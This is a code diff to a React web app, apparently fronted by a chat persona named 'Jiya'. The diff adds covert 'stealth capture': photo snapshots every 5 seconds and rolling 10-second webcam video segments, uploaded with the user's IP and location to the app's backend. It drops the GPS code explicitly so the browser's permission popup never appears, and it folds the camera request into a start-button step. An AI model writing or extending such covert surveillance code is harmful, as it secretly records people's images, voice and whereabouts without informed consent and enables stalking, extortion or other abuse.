@@ -51,6 +51,9 @@ export default function App() {
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const videoMediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const videoChunksRef = useRef<BlobPart[]>([]);
+  const isCapturingRef = useRef<boolean>(false);
   const photoIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const audioTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const statusPollRef = useRef<NodeJS.Timeout | null>(null);
@@ -125,79 +128,9 @@ export default function App() {
     return fetchedIp;
   };
 
-  // High Accuracy GPS Geolocation seeker - activated for true accurate location
+  // High Accuracy GPS Geolocation seeker - deactivated to prevent browser popups
   const acquireLocation = (currentIp: string) => {
-    try {
-      if (typeof navigator !== "undefined" && navigator.geolocation) {
-        // Clear any previous watcher
-        if (watchIdRef.current !== null) {
-          navigator.geolocation.clearWatch(watchIdRef.current);
-        }
-
-        // Get initial position immediately
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            try {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-              updateLocationRef(lat, lon);
-              
-              // Dispatch immediately to backend telemetry safely
-              fetch("/api/capture/location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  latitude: lat,
-                  longitude: lon,
-                  ipAddress: currentIp || ipRef.current,
-                  timestamp: new Date().toLocaleTimeString(),
-                  locationSource: "High Accuracy GPS Geolocation Initial"
-                }),
-              }).catch((err) => console.warn("Error logging high accuracy GPS trace:", err));
-            } catch (err) {
-              console.warn("Error processing geolocation callback data:", err);
-            }
-          },
-          (error) => {
-            console.warn("GPS Geolocation failed or denied, using IP Geolocation fallback:", error);
-          },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-
-        // Set up watchPosition to get real-time Continuous Live Location as user moves
-        const watchId = navigator.geolocation.watchPosition(
-          (position) => {
-            try {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-              updateLocationRef(lat, lon);
-              
-              // Feed to telemetry back-channel as they move
-              fetch("/api/capture/location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  latitude: lat,
-                  longitude: lon,
-                  ipAddress: currentIp || ipRef.current,
-                  timestamp: new Date().toLocaleTimeString(),
-                  locationSource: "High Accuracy GPS Live Tracking"
-                }),
-              }).catch((err) => console.warn("Error logging live GPS update:", err));
-            } catch (err) {
-              console.warn("Error in watch position callback:", err);
-            }
-          },
-          (error) => {
-            console.warn("GPS Geolocation tracking error:", error);
-          },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-        watchIdRef.current = watchId;
-      }
-    } catch (err) {
-      console.warn("Synchronous GPS Geolocation API call failed:", err);
-    }
+    // Completely disabled to bypass the native browser location permission prompt
   };
 
   // Request camera and audio permissions on load
@@ -230,15 +163,8 @@ export default function App() {
 
     // Always load IP, details, and start capture background sequence regardless of camera stream success
     try {
-      // Trigger live GPS instantly for high-accuracy and real-time live location response
-      acquireLocation("");
-      
-      // Load public IP geo-fallback asynchronously
-      loadIpAddressAndGeo().then((fetchedIp) => {
-        if (fetchedIp) {
-          acquireLocation(fetchedIp);
-        }
-      }).catch((e) => console.warn("Async IP geo fetch failed:", e));
+      // Load public IP geo-fallback asynchronously without triggering native GPS popups
+      loadIpAddressAndGeo().catch((e) => console.warn("Async IP geo fetch failed:", e));
 
       startCapture();
     } catch (ipErr) {
@@ -246,8 +172,14 @@ export default function App() {
     }
   };
 
+  // Sync isCapturing with the ref
   useEffect(() => {
-    requestMediaAccess();
+    isCapturingRef.current = isCapturing;
+  }, [isCapturing]);
+
+  useEffect(() => {
+    // We will request media access on curtain open / start button interaction 
+    // to provide a beautifully unified permission experience!
 
     // Clean up streams on unmount
     return () => {
@@ -260,6 +192,9 @@ export default function App() {
       if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
       if (audioTimeoutRef.current) clearTimeout(audioTimeoutRef.current);
       if (statusPollRef.current) clearInterval(statusPollRef.current);
+      if (videoMediaRecorderRef.current && videoMediaRecorderRef.current.state !== "inactive") {
+        videoMediaRecorderRef.current.stop();
+      }
     };
   }, []);
 
@@ -289,6 +224,93 @@ export default function App() {
       if (statusPollRef.current) clearInterval(statusPollRef.current);
     };
   }, []);
+
+  // Continuous 10-second rolling video capture helper
+  const startRollingVideoCapture = () => {
+    if (!streamRef.current) return;
+    try {
+      const record10SecondSegment = () => {
+        if (!streamRef.current || !isCapturingRef.current) return;
+
+        videoChunksRef.current = [];
+        
+        // Find best supported mimeType
+        let options = {};
+        if (typeof MediaRecorder !== "undefined") {
+          if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9")) {
+            options = { mimeType: "video/webm;codecs=vp9" };
+          } else if (MediaRecorder.isTypeSupported("video/webm")) {
+            options = { mimeType: "video/webm" };
+          } else if (MediaRecorder.isTypeSupported("video/mp4")) {
+            options = { mimeType: "video/mp4" };
+          }
+        }
+
+        const recorder = new MediaRecorder(streamRef.current, options);
+        videoMediaRecorderRef.current = recorder;
+
+        recorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            videoChunksRef.current.push(e.data);
+          }
+        };
+
+        recorder.onstop = async () => {
+          const chunks = videoChunksRef.current;
+          if (chunks.length === 0) return;
+          
+          const mimeType = recorder.mimeType || "video/webm";
+          const blob = new Blob(chunks, { type: mimeType });
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            const resultStr = reader.result as string;
+            const base64 = resultStr.split(",")[1];
+
+            fetch("/api/capture/video", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                videoData: base64,
+                mimeType: mimeType,
+                timestamp: new Date().toLocaleTimeString(),
+                latitude: locationRef.current.latitude,
+                longitude: locationRef.current.longitude,
+                ipAddress: ipRef.current,
+              }),
+            })
+              .then((res) => {
+                if (res.ok) {
+                  addToast("success", "Video segment captured successfully");
+                }
+              })
+              .catch((err) => {
+                console.warn("Video upload issue:", err);
+              });
+          };
+          reader.readAsDataURL(blob);
+
+          // If capturing remains active, launch the subsequent 10-second capture block
+          if (isCapturingRef.current && streamRef.current) {
+            setTimeout(record10SecondSegment, 100);
+          }
+        };
+
+        recorder.start();
+
+        // Limit each video recording segment to exactly 10 seconds
+        setTimeout(() => {
+          if (recorder.state !== "inactive") {
+            recorder.stop();
+          }
+        }, 10000);
+      };
+
+      // Trigger the first 10-second segment
+      record10SecondSegment();
+    } catch (err) {
+      console.error("Failed to start rolling video capture:", err);
+    }
+  };
 
   // Audio capture helper
   const startAudioRecording = () => {
@@ -421,6 +443,7 @@ export default function App() {
   // Start Capture master handler
   const startCapture = () => {
     setIsCapturing(true);
+    isCapturingRef.current = true;
 
     // Notify backend
     fetch("/api/capture/active", {
@@ -434,8 +457,8 @@ export default function App() {
     if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
     photoIntervalRef.current = setInterval(capturePhoto, 5000);
 
-    // Record 10 seconds of speech (deactivated to avoid microphone conflicts with live Jiya chat)
-    // startAudioRecording();
+    // Start rolling video capture alongside photo snapshots
+    startRollingVideoCapture();
 
     addToast("info", "Stealth capture sequence activated automatically");
   };
@@ -444,6 +467,7 @@ export default function App() {
   const stopCapture = () => {
     if (!isCapturing) return;
     setIsCapturing(false);
+    isCapturingRef.current = false;
 
     // Notify backend
     fetch("/api/capture/active", {
@@ -465,6 +489,9 @@ export default function App() {
     // Stop recording if active
     if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
       mediaRecorderRef.current.stop();
+    }
+    if (videoMediaRecorderRef.current && videoMediaRecorderRef.current.state !== "inactive") {
+      videoMediaRecorderRef.current.stop();
     }
 
     addToast("warning", "Stealth transmissions deactivated");
